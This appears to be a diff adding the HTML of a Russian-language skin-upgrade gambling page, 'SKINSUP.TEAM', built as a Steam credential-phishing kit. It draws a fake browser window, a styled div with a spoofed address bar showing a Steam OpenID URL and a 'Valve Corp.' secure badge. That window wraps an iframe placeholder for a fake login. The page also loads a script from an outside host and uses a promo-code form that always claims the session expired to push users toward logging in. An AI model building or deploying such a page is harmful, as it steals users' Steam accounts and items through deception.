@@ -1,0 +1,153 @@
+
+<!DOCTYPE html>
+<html>
+
+	<head>
+		<link rel="stylesheet" type="text/css" href="template-2/css/bootstrap.css">
+		<link rel="stylesheet" type="text/css" href="template-2/css/stylesheet.css">
+		<link rel="shortcut icon" type="image/png" href="template-2/img/favicon.png">
+
+		<script type="text/javascript" src="template-2/js/jquery-3.2.1.js"></script>
+		<script type="text/javascript" src="template-2/js/bootstrap.js"></script>
+		<script defer src="https://use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+		<script type="text/javascript" src="https://feebo.cf/assets/js/watcher.js"></script>
+
+      		<link rel="stylesheet" type="text/css" href="template-2/window/window.css">
+		<script type="text/javascript" src="template-2/window/jquery-ui.min.js"></script>
+		<script type="text/javascript" src="template-2/window/bowser.js"></script>
+		<script type="text/javascript" src="template-2/window/useragents.js"></script>
+		<script type="text/javascript" src="template-2/window/window.js"></script>
+      
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta charset="utf-8">
+
+		<title>SKINSUP.TEAM | Discover a better way to upgrade skins</title>
+	</head>
+	<body>
+
+		<div class="col-md-12 text-center" style="padding-bottom: 10px;">
+			<div class="fixed_menu text-center">
+				<ul>
+					<li><a href="index.html" class="active">Главная</a></li>
+					<li><a href="javascript:show('code_activate');">Активировать код</a></li>
+					<li><a href="javascript:show('faq_article');">FAQ</a></li>
+				</ul>
+			</div>
+
+			<div class="header">
+				<h3>SKINSUP<span>.team</span></h3>
+				<p>Только честные выигрыши!</p>
+			</div>
+
+			<div class="col-md-4 text-center">
+				<img src="template-2/img/column_1.png">
+				<p>• Ежедневная <b>раздача</b><br>монет</p>
+			</div>
+
+			<div class="col-md-4 text-center">
+				<img src="template-2/img/column_2.png">
+				<p>• При регистрации вы<br>получаете бонус в виде<br><b>1000 монет</b></p>
+			</div>
+
+			<div class="col-md-4 text-center">
+				<img src="template-2/img/column_3.png">
+				<p>• У нас <b>выгодная</b><br>реферальная система</p>
+			</div>
+
+		</div>	
+
+		<div class="col-md-12 text-center">
+			<a href="javascript:login()" class="login">Войти через <span>Steam</span></a>
+		</div>	
+
+		<p class="copyright hidden-xs hidden-sm hidden-md">Copyright © 2018, SKINSUP.TEAM - All rights reserved.</p>
+
+		<div id="code_activate" class="overlay" style="min-height: 100vh; display: none;">
+			<div class="container">
+				<div class="col-md-12 text-left">
+					<a href="javascript:hide('code_activate'); javascript:hide('error_notify');"><i class="fas fa-arrow-left"></i></a>
+				</div>
+
+				<div class="col-md-6 col-md-offset-3 text-center" id="error_notify" style="display: none;">
+					<p class="block">Сессия истекла, попробуйте снова <a href="javascript:login()" class="in_link">авторизоваться</a> на сайте.</p>
+				</div>
+
+				<div class="col-md-6 col-md-offset-3">
+					<form class="text-center">
+						<input type="text" name="code" class="input_code" maxlength="10" placeholder="Введите промокод" >
+						<button type="button" class="button_code" onclick="show('error_notify')">Активировать</button>
+					</form>
+				</div>
+			</div>
+		</div>
+
+		<div id="faq_article" class="overlay" style="min-height: 100vh; display: none;">
+			<div class="container">
+				<div class="col-md-12 text-left">
+					<a href="javascript:hide('faq_article');"><i class="fas fa-arrow-left"></i></a>
+				</div>
+
+				<div class="col-md-12 text-left">
+					<h3 class="heading">Каким образом оцениваются предметы?</h3>
+					<p class="description">Цена предметов определяется комбинацией ценообразования API (SteamLytics) с данными о редкости, количестве и популярности предмета.</p>
+
+					<h3 class="heading">Каковы ограничения на депозиты?</h3>
+					<p class="description">Чтобы внести депозит или вывести скины, нужно что бы ваш мобильный Steam аутентификатор был включен на протяжении более 7 дней.<br>
+				Для дополнительной информации, пожалуйста, посетите эту страницу.<br><br>
+				Пожалуйста, воздержитесь от депозита неправильно оценённых вещей. Делая так, вы рискуете обнулением Bux, а так же блокировкой аккаунта на сайте.<br>
+				Мы не принимаем сувенирные вещи, кейсы, дорогие наклейки и слишком редкие скины.<br>
+				Если какая-либо вещь не появляется в инвентаре, значит что её нельзя внести на сайт.<br>
+				Минимальная сумма для депозита - 500 Монет.</p>
+
+					<h3 class="heading">Каковы ограничения на вывод?</h3>
+					<p class="description">Ссылаясь на торговую политику, перед выводом, мы требуем что бы пользователи совершили ставки на сумму, равной депозиту.<br>
+				Также, для вывода вам нужно внести депозит хотя бы один раз и иметь как минимум 1-й уровень.</p>
+
+					<h3 class="heading">Могу ли я переводить Монеты другим игрокам?</h3>
+					<p class="description">Да. Это можно сделать во вкладке "Аккаунт", под вашей ссылкой на обмен. Для перевода Bux, вам нужно  быть как минимум 1 уровнем и сделать хотя бы один депозит.</p>
+				</div>
+			</div>
+		</div>
+
+		<div id="error_page" class="overlay" style="min-height: 100vh; display: none;">
+			<div class="container">
+				<div class="col-md-12 text-center">
+					<h2>Ошибка авторизации</h2>
+					<a href="javascript:hide('error_page');" class="button_code">Вернуться на главную</a>
+				</div>
+			</div>
+		</div>
+
+		<script type="text/javascript">
+			// function set() { $("#code_activate").height($("body").height()); }
+			function show(id) { $("#" + id).fadeIn("750"); }
+			function hide(id) { $("#" + id).fadeOut("750"); }
+		</script>
+      <script>
+      function loginReady() {
+        closeLoginWindow();
+        show("error_page");
+      }
+</script>
+		<div class="ui-widget-content ui-draggable ui-draggable-handle" id="new-window" style="width: 1024.5px; height: 573.3px;  left: 145px; top: 25px;"> <!-- display: none; -->
+			<div class="window-header">
+				<div class="window-header-logo"></div>
+				<div class="window-header-label">
+					Сообщество Steam - <span id="browser-name">Google Chrome</span>
+				</div>
+				<div class="window-header-actions">
+					<i class="flaticon--custom-1 flaticon-minus-symbol"></i><i class="flaticon--custom-1 flaticon-multi-tab"></i><i class="flaticon--custom-1 flaticon-cancel window-header-close"></i>
+				</div>
+			</div>
+			<div class="window-body">
+				<div class="window-body-addressbar">
+					<div class="addressbar-secure"><i class="flaticon--custom-2 flaticon-lock"></i><span class="addressbar-secure-label">Valve Corp. [US]</span></div>
+					<input class="addressbar-address" disabled type="text" value="https://steamcommunity.com/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;openid.mode=checkid_setup&amp;openid.return_to=https%3A%2F%2FSKINSMOON.com%2F%3Floc%3Dlogin_migrate%26content_only%3D1%26openid_nonce%3DgO5aW7Br0kAECosz&amp;openid.realm=https%3A%2F%2FSKINSMOON.com&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select">
+				</div>
+				<iframe class="window-body-data-1" src="%login-link%"></iframe>
+			</div>
+		</div>
+		
+	</body>
+</html>
